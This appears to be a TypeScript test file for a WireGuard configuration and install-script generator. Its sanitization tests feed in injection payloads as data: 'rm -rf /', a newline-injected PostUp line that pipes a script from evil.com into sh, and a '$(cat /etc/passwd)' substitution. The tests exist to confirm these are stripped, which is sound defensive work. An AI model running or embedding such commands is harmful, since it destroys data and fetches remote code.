import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  generateWireGuardServerConfig,
  generateWireGuardClientConfig,
  generateWireGuardServerOneLiner,
} from './wireguardGenerator';
import { WireGuardSettings } from '../types';

const dummySettings: WireGuardSettings = {
  serverEndpoint: '203.0.113.10',
  serverPort: 51820,
  tunnelSubnet: '10.8.0.0/24',
  serverIp: '10.8.0.1',
  clientIp: '10.8.0.2',
  dnsResolver: '1.1.1.1, 8.8.8.8',
  mtu: 1420,
  persistentKeepalive: 25,
  allowedIps: '0.0.0.0/0, ::/0',
  interfaceName: 'wg0',
  serverPrivateKey: 'serverPrivKey123=',
  serverPublicKey: 'serverPubKey123=',
  clientPrivateKey: 'clientPrivKey123=',
  clientPublicKey: 'clientPubKey123=',
  serverInterface: 'eth0',
};

describe('WireGuard Generator', () => {
  it('generates valid server config', () => {
    const config = generateWireGuardServerConfig(dummySettings);
    assert.match(config, /Address = 10\.8\.0\.1\/24/);
    assert.match(config, /ListenPort = 51820/);
    assert.match(config, /PrivateKey = serverPrivKey123=/);
    assert.match(config, /PublicKey = clientPubKey123=/);
  });

  it('generates valid client config', () => {
    const config = generateWireGuardClientConfig(dummySettings);
    assert.match(config, /Address = 10\.8\.0\.2\/24/);
    assert.match(config, /PublicKey = serverPubKey123=/);
    assert.match(config, /Endpoint = 203\.0\.113\.10:51820/);
    assert.match(config, /MTU = 1420/);
  });

  it('generates multi-distro server one-liner supporting apk, dnf, yum, and apt-get', async () => {
    const oneLiner = generateWireGuardServerOneLiner(dummySettings);
    assert.ok(oneLiner.includes('command -v apk'), 'should check for apk');
    assert.ok(oneLiner.includes('command -v dnf'), 'should check for dnf');
    assert.ok(oneLiner.includes('wireguard-tools'), 'should install wireguard-tools');
    assert.ok(oneLiner.includes('command -v yum'), 'should check for yum');
    assert.ok(oneLiner.includes('command -v apt-get'), 'should check for apt-get');
    assert.ok(oneLiner.includes('rc-service'), 'should support OpenRC');
    assert.ok(oneLiner.includes('systemctl enable wg-quick@wg0'), 'should support systemd service');

    const scriptWithoutSudo = oneLiner.replace(/^sudo /, '');
    const { execFile } = await import('node:child_process');
    const { promisify } = await import('node:util');
    const execFileAsync = promisify(execFile);

    const { stderr } = await execFileAsync('bash', ['-n', '-c', scriptWithoutSudo]);
    assert.equal(stderr, '');
  });

  describe('Security & Input Sanitization', () => {
    it('sanitizes interface names to prevent command injection and configuration directive injection', () => {
      const maliciousSettings: WireGuardSettings = {
        ...dummySettings,
        serverInterface: "eth0; rm -rf / ' && echo hacked",
        interfaceName: "wg0\nPostUp = curl http://evil.com/malware.sh | sh",
      };

      const serverConfig = generateWireGuardServerConfig(maliciousSettings);
      assert.doesNotMatch(serverConfig, /rm -rf/);
      assert.doesNotMatch(serverConfig, /echo hacked/);
      assert.doesNotMatch(serverConfig, /\nPostUp = curl/);

      const oneLiner = generateWireGuardServerOneLiner(maliciousSettings);
      assert.doesNotMatch(oneLiner, /rm -rf/);
      assert.doesNotMatch(oneLiner, /echo hacked/);
      assert.doesNotMatch(oneLiner, /\| sh/);
    });

    it('sanitizes keys, endpoints, and IPs to prevent script breakout', () => {
      const maliciousSettings: WireGuardSettings = {
        ...dummySettings,
        serverPrivateKey: "key' || rm -rf / ; #",
        clientPublicKey: "pubKey' && reboot #",
        serverEndpoint: "203.0.113.10' ; $(cat /etc/passwd) #",
        serverIp: "10.8.0.1\nAddress = 0.0.0.0",
        clientIp: "10.8.0.2' -- drop table users",
        serverPort: 99999, // invalid port range
      };

      const serverConfig = generateWireGuardServerConfig(maliciousSettings);
      assert.doesNotMatch(serverConfig, /\nAddress = 0\.0\.0\.0/);
      assert.match(serverConfig, /ListenPort = 51820/); // falls back to default 51820

      const clientConfig = generateWireGuardClientConfig(maliciousSettings);
      assert.doesNotMatch(clientConfig, /\$\(cat/);
      assert.doesNotMatch(clientConfig, /cat \/etc\/passwd/);

      const oneLiner = generateWireGuardServerOneLiner(maliciousSettings);
      assert.doesNotMatch(oneLiner, /' \|\|/);
      assert.doesNotMatch(oneLiner, /' &&/);
      assert.doesNotMatch(oneLiner, /'\s*;/);
    });
  });
});
